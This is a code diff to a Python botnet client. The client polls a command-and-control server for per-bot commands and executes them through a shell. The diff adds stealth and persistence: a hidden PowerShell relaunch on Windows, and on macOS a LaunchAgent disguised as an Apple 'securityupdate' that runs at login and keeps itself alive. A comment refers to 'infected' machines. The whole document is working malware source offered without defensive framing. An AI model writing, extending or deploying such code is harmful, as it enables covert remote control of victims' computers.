@@ -2,6 +2,8 @@ import requests
 import time
 import subprocess
 import multiprocessing
+import os
+import platform
 
 # C2 Server URL
 C2_URL = "http://127.0.0.1:5001"
@@ -15,10 +17,10 @@ def bot_instance(bot_id):
             requests.post(f"{C2_URL}/register")
 
             # Fetch command from C2 server
-            command = requests.get(f"{C2_URL}/command").text
+            command = requests.get(f"{C2_URL}/command/{bot_id}").text
 
             # Execute the command if it's not empty
-            if command and command != "No command":
+            if command and command.lower() != "no command":
                 result = subprocess.run(command, shell=True, capture_output=True)
                 print(f"[Bot {bot_id}] Executed Command: {command}")
                 print(f"[Bot {bot_id}] Output: {result.stdout.decode().strip()}")
@@ -31,19 +33,48 @@ def bot_instance(bot_id):
             time.sleep(5)
 
 
-# Function to spawn 98 bots
-def start_bots():
-    bot_processes = []
+# Hide bot execution (Windows & macOS)
+def hide_execution():
+    """ Runs bot in the background without showing a console window. """
 
-    for i in range(1, 99):  # 98 additional bots (IDs 1 to 98)
-        p = multiprocessing.Process(target=bot_instance, args=(i,))
-        p.start()
-        bot_processes.append(p)
+    if os.name == "nt":  # Windows
+        startupinfo = subprocess.STARTUPINFO()
+        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "python", __file__],
+                         startupinfo=startupinfo)
 
-    # Keep main process alive
-    for p in bot_processes:
-        p.join()
+    elif platform.system() == "Darwin":  # macOS
+        plist_path = os.path.expanduser("~/Library/LaunchAgents/com.apple.securityupdate.plist")
+        plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+        <plist version="1.0">
+        <dict>
+            <key>Label</key>
+            <string>com.apple.securityupdate</string>
+            <key>ProgramArguments</key>
+            <array>
+                <string>/usr/bin/python3</string>
+                <string>{os.path.abspath(__file__)}</string>
+            </array>
+            <key>RunAtLoad</key>
+            <true/>
+            <key>KeepAlive</key>
+            <true/>
+        </dict>
+        </plist>
+        """
+
+        with open(plist_path, "w") as f:
+            f.write(plist_content)
+
+        os.system(f"launchctl load {plist_path}")
+
+        print("[*] Persistence added for macOS.")
 
 
 if __name__ == "__main__":
-    start_bots()
+    # Hide execution first
+    hide_execution()
+
+    # Start bot process
+    bot_instance(1)  # Runs only one bot per infected machine
